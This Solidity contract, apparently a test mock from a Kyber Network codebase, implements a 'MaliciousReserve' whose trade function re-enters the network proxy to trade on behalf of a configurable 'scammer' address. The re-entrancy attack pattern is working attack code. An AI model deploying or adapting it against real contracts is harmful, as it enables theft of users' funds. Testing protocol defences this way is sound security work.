pragma solidity 0.5.11;

import "../IKyberReserve.sol";
import "../utils/Utils4.sol";
import "../utils/zeppelin/SafeERC20.sol";
import "../IKyberNetworkProxy.sol";


contract MaliciousReserve is IKyberReserve, Utils4 {
    using SafeERC20 for IERC20;

    mapping(address => uint256) public buyTokenRates;
    IKyberNetworkProxy proxy;
    address payable scammer;
    IERC20 public scamToken;

    uint256 public numRecursive = 1;

    function() external payable {}

    function trade(
        IERC20 srcToken,
        uint256 srcAmount,
        IERC20 destToken,
        address payable destAddress,
        uint256 conversionRate,
        bool validate
    ) public payable returns (bool) {
        require(srcToken == ETH_TOKEN_ADDRESS, "not buy token");

        if (numRecursive > 0) {
            --numRecursive;

            doTrade();
        }

        validate;
        require(msg.value == srcAmount, "ETH sent != srcAmount");

        uint256 srcDecimals = getDecimals(srcToken);
        uint256 destDecimals = getDecimals(destToken);
        uint256 destAmount = calcDstQty(srcAmount, srcDecimals, destDecimals, conversionRate);

        // send dest tokens
        destToken.safeTransfer(destAddress, destAmount);

        return true;
    }

    function doTrade() public {
        uint256 callValue = 960;

        proxy.trade.value(callValue)(
            ETH_TOKEN_ADDRESS,
            callValue,
            scamToken,
            scammer,
            (2**255),
            0,
            address(0)
        );
    }

    function setDestAddress(address payable _scammer) public {
        scammer = _scammer;
    }

    function setDestToken(ERC20 _token) public {
        scamToken = _token;
    }

    function setKyberProxy(IKyberNetworkProxy _proxy) public {
        proxy = _proxy;
    }

    function setNumRecursive(uint256 num) public {
        numRecursive = num;
    }

    function setRate(IERC20 token, uint256 buyRate) public {
        buyTokenRates[address(token)] = buyRate;
    }

    function getConversionRate(
        IERC20 src,
        IERC20 dest,
        uint256 srcQty,
        uint256 blockNumber
    ) public view returns (uint256) {
        blockNumber;
        srcQty;

        if (src == ETH_TOKEN_ADDRESS) {
            return buyTokenRates[address(dest)];
        }
        return 0;
    }

    function getTokenDecimals(IERC20 token) public view returns (uint256) {
        return getDecimals(token);
    }
}
